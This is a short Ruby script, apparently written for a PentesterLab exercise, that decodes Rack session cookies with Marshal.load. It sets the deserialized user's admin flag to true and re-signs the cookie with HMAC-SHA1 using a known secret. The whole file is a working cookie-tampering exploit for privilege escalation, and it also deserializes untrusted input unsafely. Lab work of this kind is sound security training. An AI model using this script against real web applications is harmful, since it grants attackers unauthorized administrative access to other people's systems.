require 'pp'
require 'uri'
require 'base64'
require 'openssl'
require 'data_mapper'

# usage: tamper-cookie <file> <secret>
# 
# Params:
#   file    :   File containing url encoded rack cookies. One per line
#   secret  :   Secret word to sign tampered cookies with
#
# Script to decode a rack cookie and deserialize it into a Ruby object
# Modify privileges on the object and resign the object back into a cookie
#
# Note: This script is not designed to work for the general case but 
# might be used for kickstarting the process of decoding a rack cookie
#
# https://www.pentesterlab.com/exercises/rack_cookies_and_commands_injection/
#
# Author: Alexander DuPree
# https://gitlab.com/adupree/cs495-alexander-dupree/RCCI

DataMapper.setup(:default, 'sqlite3::memory')

class User
    attr_accessor :admin
end

def encode_object(obj, secret)

    obj["user"].admin = true

    data = Base64.encode64(Marshal.dump(obj))

    signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)

    # URI encode doesn't encode '=' character
    return URI.encode(data).gsub("=", "%3D")+"--"+signature
end

def decode_cookie(c)
    cookie = c.split("--")

    # Undo URL encode then base64 decode
    decoded = Base64.decode64(URI.decode(cookie[0]))

    begin
        obj = Marshal.load(decoded)
        puts("Decoded Cookie:\n")
        return obj
    rescue ArgumentError => err
        puts "( ERROR ) decode-cookie: " + err.to_s
    end
end

def main

    if ARGV.length != 2
        puts('usage: tamper-cookie <file> <secret>')
        return 1
    end

    cookies = IO.readlines(ARGV[0], chomp: true)

    for cookie in cookies

        obj = decode_cookie(cookie)
        puts("Decoded Cookie:\n")
        pp obj

        new_cookie = encode_object(obj, ARGV[1])
        puts("\nTampered Cookie:\n")
        puts(new_cookie)
    end
    return 0
end

main